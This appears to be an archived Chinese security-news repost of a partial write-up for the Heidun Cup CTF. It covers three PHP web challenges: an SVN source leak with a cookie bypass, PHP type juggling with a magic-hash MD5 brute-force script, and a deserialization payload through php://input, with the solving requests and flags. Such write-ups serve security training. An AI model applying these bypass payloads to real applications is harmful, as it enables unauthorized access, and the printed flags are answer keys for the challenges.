@@ -1,0 +1,107 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>黑盾杯 部分writeup</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>黑盾杯 部分writeup</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzUyMzczNzUyNQ==&amp;mid=2247484436&amp;idx=4&amp;sn=8e9723b31c6c0d384aa13ecf94de7ecc&amp;chksm=fa3944cecd4ecdd8c9df81f36cf39822e07588d758372bfc5944a8910966f0eb951281cee3a9&amp;scene=126&amp;sessionid=1681376514#rd">http://mp.weixin.qq.com/s?__biz=MzUyMzczNzUyNQ==&amp;mid=2247484436&amp;idx=4&amp;sn=8e9723b31c6c0d384aa13ecf94de7ecc&amp;chksm=fa3944cecd4ecdd8c9df81f36cf39822e07588d758372bfc5944a8910966f0eb951281cee3a9&amp;scene=126&amp;sessionid=1681376514#rd</a></blockquote><section style="background-color: rgb(255, 255, 255);box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="margin-right: 0%;margin-bottom: 10px;margin-left: 0%;box-sizing: border-box;"><section class="" style="display: inline-block;width: 100%;vertical-align: top;border-style: solid;border-width: 2px;border-radius: 0px;border-color: rgb(80, 162, 238);padding: 15px;box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="box-sizing: border-box;"><section class="" style="font-size: 15px;color: rgb(40, 40, 40);text-align: center;box-sizing: border-box;"><p style="box-sizing: border-box;"><span style="font-size: 14px;">更多全球网络安全资讯尽在邑安全</span></p><p style="box-sizing: border-box;"><span style="box-sizing: border-box;font-size: 14px;">www.eansec.com</span></p></section></section></section></section></section></section></section><section style="background-color: rgb(255, 255, 255);box-sizing: border-box;"><section class="Powered-by-XIUMI V5" powered-by="xiumi.us"><section class="" style="margin-top: 10px;margin-bottom: 10px;box-sizing: border-box;"><br/></section><h2 name="h2-0" style="box-sizing: border-box;margin-top: 12px;margin-bottom: 0.5rem;font-family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size: 22px;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 14px;">信息泄露+代码审计</span></h2><p style="box-sizing: border-box;margin-bottom: 1rem;color: rgb(88, 88, 88);font-family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 14px;">svn泄露源码：http://192.168.200.200/web/codeaudit/.svn/text-base/index.php.svn-base.txt</span></p><pre style="box-sizing: border-box;font-family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: 14px;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><span style="font-size: 14px;">&lt;?php
+error_reporting(0);
+$user = $_COOKIE['user'];
+$code = $_GET['code']?(int)$_GET['code']:'';
+if($user == 'admin' &amp;&amp; !empty($code)) {
+	$hex = (int)$code;
+	if(($hex ^ 6789) === 0xCDEF) {
+		require("flag.php");
+		echo $flag;
+		exit();
+	}	
+echo "ȱ��Ӧ�еĲ���,��û��Ȩ�޲鿴������";
+?&gt;</span></pre><p style="box-sizing: border-box;margin-bottom: 1rem;color: rgb(88, 88, 88);font-family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 14px;">GET 请求code=55146 ， 请求头添加Cookie: user=admin; 。</span></p><p style="box-sizing: border-box;margin-bottom: 1rem;color: rgb(88, 88, 88);font-family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 14px;">flag{a737c5c5b759c3705c8100accf65b5e4}</span></p><p style="box-sizing: border-box;margin-bottom: 1rem;color: rgb(88, 88, 88);font-family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 14px;"> </span></p><h2 name="h2-1" style="box-sizing: border-box;margin-top: 12px;margin-bottom: 0.5rem;font-family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size: 22px;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 14px;">最好的语言</span></h2><pre style="box-sizing: border-box;font-family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: 14px;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><span style="font-size: 14px;">&lt;?php 
+show_source(__FILE__); 
+$a=0; 
+$b=0; 
+$c=0; 
+$d=0; 
+if (isset($_GET['x1'])) //$x1=0;=&gt;$a=1;
+{ 
+        $x1 = $_GET['x1']; 
+        $x1=="1"?die("ha?"):NULL; 
+        switch ($x1) 
+        { 
+        case 0: 
+        case 1: 
+                $a=1; 
+                break; 
+        } 
+} 
+$x2=(array)json_decode(@$_GET['x2']); 
+//$x2=json_encode(['x21'=&gt;'2018hello','x22'=&gt;[[],0]]) ;
+//string(32) "{"x21":"2018hello","x22":[[],0]}"
+if(is_array($x2)){ 
+    is_numeric(@$x2["x21"])?die("ha?"):NULL; 
+    if(@$x2["x21"]){ 
+        ($x2["x21"]&gt;2017)?$b=1:NULL; 
+    } 
+    if(is_array(@$x2["x22"])){ 
+        if(count($x2["x22"])!==2 OR !is_array($x2["x22"][0])) die("ha?"); 
+        $p = array_search("XIPU", $x2["x22"]); 
+        //array_search — 在数组中搜索给定的值，如果成功则返回相应的键名 
+        //mixed array_search( mixed $needle, array $haystack[, bool $strict = false] )
+        //第三个参数决定在搜索时是否比较类型，默认不比较，也是这里能够绕过的原因。
+        //var_dump(array_search('XIPU', array("0","1",0)));//int(2)
+        //0==‘XIPU’为真，搜索到0值的下标为2
+        $p===false?die("ha?"):NULL; 
+        foreach($x2["x22"] as $key=&gt;$val){ 
+            $val==="XIPU"?die("ha?"):NULL; 
+        } 
+        $c=1; 
+} 
+} 
+$x3 = $_GET['x3']; 
+if ($x3 != '15562') { 
+    if (strstr($x3, 'XIPU')) { 
+        if (substr(md5($x3),8,16) == substr(md5('15562'),8,16)) { 
+            //两个符合正则  /0e\d+/  的字符串弱相等。
+            // 爆破见下方python代码
+            $d=1; 
+        } 
+    } 
+} 
+if($a &amp;&amp; $b &amp;&amp; $c &amp;&amp; $d){ 
+    include "flag.php"; 
+    echo $flag; 
+} 
+?&gt;</span></pre><pre style="box-sizing: border-box;font-family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: 14px;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><span style="font-size: 14px;">def brute():
+    for a in range(0x20, 0x7f):
+        for b in range(0x20, 0x7f):
+            for c in range(0x20, 0x7f):
+                    x = chr(a) + chr(b) + chr(c)+s
+                    mm=md5(x.encode('UTF-8')).hexdigest()
+                    flag=1
+                    for i in mm[10:24]:
+                        if i not in '0123456789':
+                            flag=0
+                            break
+                    if flag and mm[8:10]=='0e':
+                        print(x)
+
+brute()
+# kN[XIPU
+# v=|XIPU
+# y'wXIPU
+# }MOXIPU
+# ~VhXIPU
+## http://192.168.200.200/web/bestlanguage/?x1=0&amp;x2={%22x21%22:%222018hello%22,%22x22%22:[[],0]}&amp;x3=~VhXIPU
+## flag{510ea2879fa29d0d618b1f55350965c3}</span></pre><p style="box-sizing: border-box;margin-bottom: 1rem;color: rgb(88, 88, 88);font-family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 14px;"> </span></p><h2 name="h2-2" style="box-sizing: border-box;margin-top: 12px;margin-bottom: 0.5rem;font-family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size: 22px;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 14px;">the user is admin</span></h2><p style="box-sizing: border-box;margin-bottom: 1rem;color: rgb(88, 88, 88);font-family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 14px;">和 bugku 平台某个题目原理相似，因此没有保留源码。可以参考 该题 ，不赘述。</span></p><pre style="box-sizing: border-box;font-family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: 14px;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><span style="font-size: 14px;">/web/theuserisadmin/?file=class.php&amp;user=php://input&amp;pass=O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";}
+
+post:the user is admin
+    
+//flag{078d8dd8023d5716a11780adf344dfd2}</span></pre><section class=""><span style="font-size: 14px;">转自安全客<br/></span></section><section class="" style="margin-top: 10px;margin-bottom: 10px;box-sizing: border-box;text-align: center;"><span style="color: rgb(80, 162, 238);font-size: 14px;">欢迎收藏并分享朋友圈，让五邑人网络更安全<br/></span></section><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.9955357142857143" data-s="300,640" data-src="https://mmbiz.qpic.cn/mmbiz_jpg/1N39PtINn8tD9ic928O6vIrMg4fuib48e1TsRj9K9Cz7RZBD2jjVZcKm1N4QrZ4bwBKZic5crOdItOcdDicPd3yBSg/640?wx_fmt=jpeg" data-type="jpeg" data-w="224" style="width: 157px;height: 156px;" src="../Images/f991b2ae7d17500c856a541522a74428.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_jpg/1N39PtINn8tD9ic928O6vIrMg4fuib48e1TsRj9K9Cz7RZBD2jjVZcKm1N4QrZ4bwBKZic5crOdItOcdDicPd3yBSg/640?wx_fmt=jpeg"/></p><section class="" style="margin-top: 10px;margin-bottom: 10px;box-sizing: border-box;text-align: center;"><span style="font-size: 14px;color: rgb(80, 162, 238);">欢迎扫描关注我们，及时了解最新安全动态、学习最潮流的安全姿势！<br/></span></section><section style="background-color: rgb(255, 255, 255);box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="margin-top: 0.5em;box-sizing: border-box;"><section class="" style="height: 1px;background-color: rgb(95, 156, 239);box-sizing: border-box;"/><section class="" style="margin-top: 0.3em;margin-bottom: 0.3em;height: 3px;background-color: rgb(95, 156, 239);box-sizing: border-box;"/><section class="" style="border-width: 1px;border-style: solid;box-shadow: rgb(226, 226, 226) 0px 16px 1px -13px;border-color: rgb(95, 156, 239);padding: 0.5em;box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="margin: 10px 0%;box-sizing: border-box;"><section class="" style="display: inline-block;width: 100%;vertical-align: top;background-color: rgb(247, 247, 247);padding-top: 10px;padding-bottom: 10px;box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="margin-right: 0%;margin-bottom: 10px;margin-left: 0%;box-sizing: border-box;"><section class="" style="display: inline-block;width: 100%;border-style: solid;border-width: 0px 0px 0px 6px;padding-right: 6px;padding-left: 6px;border-left: 6px solid rgb(80, 162, 238);border-right: 0px solid rgb(80, 162, 238);box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="box-sizing: border-box;"><section class="" style="box-sizing: border-box;"><p style="box-sizing: border-box;"><span style="font-size: 14px;">推荐文章</span></p></section></section></section></section></section></section><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="text-align: center;box-sizing: border-box;"><section class="" style="display: inline-table;border-collapse: collapse;table-layout: fixed;width: 95%;box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="display: table-row-group;box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="display: table-row;width: 100%;box-sizing: border-box;"><section class="" style="display: table-cell;vertical-align: top;width: 10%;border-width: 1px;border-radius: 0px;border-style: none;border-color: rgb(62, 62, 62);box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="margin: 6px 0%;font-size: 8px;box-sizing: border-box;"><section class="" style="display: inline-block;border-width: 2px;border-style: dotted;border-color: rgba(248, 248, 248, 0);width: 1.6em;height: 1.6em;border-radius: 0.3em;font-size: 12px;line-height: 1.5em;color: rgb(255, 255, 255);background-color: rgb(95, 156, 239);box-sizing: border-box;"><p style="box-sizing: border-box;"><span style="font-size: 14px;">1</span></p></section></section></section></section><section class="" style="display: table-cell;vertical-align: top;width: 90%;border-style: none;border-width: 1px;border-radius: 0px;border-color: rgb(62, 62, 62);padding-left: 6px;box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="margin: 5px 0%;box-sizing: border-box;"><section class="" style="text-align: justify;padding-right: 5px;padding-left: 5px;font-size: 14px;line-height: 1.8;box-sizing: border-box;"><p style="white-space: normal;box-sizing: border-box;"><a href="http://mp.weixin.qq.com/s?__biz=MzUyMzczNzUyNQ==&amp;mid=2247483671&amp;idx=1&amp;sn=5392d3c543eff0903b5e3871b97fe917&amp;chksm=fa3941cdcd4ec8db0b769837d404395ed87f23dbe56161717b02265a40f23d955b7cce55fbf2&amp;scene=21#wechat_redirect" target="_blank" style="font-size: 14px;text-decoration: underline;"><span style="font-size: 14px;">Django入门之旅-启程</span></a></p></section></section></section></section></section></section><section class="Powered-by-XIUMI V5" style="display: table-row-group;box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="display: table-row;width: 100%;box-sizing: border-box;"><section class="" style="display: table-cell;vertical-align: top;width: 10%;border-width: 1px;border-radius: 0px;border-style: none;border-color: rgb(62, 62, 62);box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="margin: 6px 0%;font-size: 8px;box-sizing: border-box;"><section class="" style="display: inline-block;border-width: 2px;border-style: dotted;border-color: rgba(248, 248, 248, 0);width: 1.6em;height: 1.6em;border-radius: 0.3em;font-size: 12px;line-height: 1.5em;color: rgb(255, 255, 255);background-color: rgb(95, 156, 239);box-sizing: border-box;"><p style="box-sizing: border-box;"><span style="font-size: 14px;">2</span></p></section></section></section></section><section class="" style="display: table-cell;vertical-align: top;width: 90%;border-style: none;border-width: 1px;border-radius: 0px;border-color: rgb(62, 62, 62);padding-left: 6px;box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="margin: 5px 0%;box-sizing: border-box;"><section class="" style="text-align: justify;padding-right: 5px;padding-left: 5px;font-size: 14px;line-height: 1.8;box-sizing: border-box;"><p style="white-space: normal;box-sizing: border-box;"><a href="http://mp.weixin.qq.com/s?__biz=MzUyMzczNzUyNQ==&amp;mid=2247483652&amp;idx=1&amp;sn=b2f2ec90db499e23cfa252e9ee743265&amp;chksm=fa3941decd4ec8c83a268c3480c354a621d515262bcbb5f35e1a2dde8c828bdc7b9011cb5072&amp;scene=21#wechat_redirect" target="_blank" style="font-size: 14px;text-decoration: underline;"><span style="font-size: 14px;">重大漏洞预警：ubuntu最新版本存在本地提权漏洞（已有EXP）　</span></a></p></section></section></section></section></section></section><section class="Powered-by-XIUMI V5" style="display: table-row-group;box-sizing: border-box;" powered-by="xiumi.us"/></section></section></section></section></section></section></section></section></section></section></section></section><p><br/></p>
+        
+</body>
+</html>
